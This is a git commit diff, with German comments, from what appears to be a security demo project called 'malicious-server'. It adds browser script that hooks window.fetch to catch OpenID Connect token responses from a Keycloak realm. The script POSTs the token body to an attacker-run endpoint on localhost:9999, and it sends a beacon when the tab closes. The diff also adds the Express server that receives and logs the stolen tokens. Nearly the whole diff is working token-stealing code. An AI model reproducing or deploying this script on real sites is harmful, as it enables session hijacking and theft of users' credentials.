41e69199f304a97ad81a0c5a1c21291573f0aa4f
nick1699 <accounts@nickboard.de>
2024-04-01 15:00:14 +0200

    send token to malicious server

--- malicious-server/public/attack.js
+++ malicious-server/public/attack.js
@@ -5,12 +5,22 @@
     window.fetch = function(...args) {
         const requestURI = args[0].href;
         // Man in the middle bei Token-Endpoint
-        if (requestURI.includes('/realms/cyber-attack/protocol/openid-connect/token')) {
+        if (requestURI && requestURI.includes('/realms/cyber-attack/protocol/openid-connect/token')) {
             return originalFetch.apply(this, args).then(response => {
                 const clonedResponse = response.clone();
 
                 clonedResponse.json().then(body => {
-                    console.log('Gelesener Body der Response:', body);
+                    fetch('http://localhost:9999/rest/receive-token-body', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(body),
+                    }).then(() => {
+                        console.log('Token-Body erfolgreich an den Server gesendet.');
+                    }).catch(error => {
+                        console.error('Fehler beim Senden des Token-Body an den Server:', error);
+                    });
                 }).catch(error => {
                     console.error('Fehler beim Lesen des Response-Body:', error);
                 });
@@ -23,16 +33,8 @@
     };
 })();
 
-// fetch('http://localhost:9999/rest/receive-token')
-//     .then(response => {
-//         if (!response.ok) {
-//             throw new Error('Netzwerkantwort war nicht ok');
-//         }
-//         return response.json();
-//     })
-//     .then(data => {
-//         console.log(data);
-//     })
-//     .catch(error => {
-//         console.error('Fehler beim Fetchen:', error);
-//     });
+function informServerAboutTabClose() {
+    navigator.sendBeacon('http://localhost:9999/rest/tab-closed', JSON.stringify({ message: 'Tab geschlossen' }));
+}
+
+window.addEventListener('beforeunload', informServerAboutTabClose);
--- malicious-server/src/server.js
+++ malicious-server/src/server.js
@@ -1,12 +1,18 @@
 const express = require('express');
+const bodyParser = require('body-parser');
 const app = express();
 const port = 9999;
 
+app.use(bodyParser.json());
 app.use(express.static('public'));
 
-app.get('/rest/receive-token', (req, res) => {
-    console.log("Hat funktioniert");
-    res.status(200).send('Daten empfangen');
+app.post('/rest/receive-token-body', (req, res) => {
+    console.log("Empfangener Token-Body:", req.body);
+    res.status(200).send();
+});
+
+app.post('/rest/tab-closed', (req, res) => {
+    console.log("Tab oder Browser wurde geschlossen");
 });
 
 app.listen(port, () => {
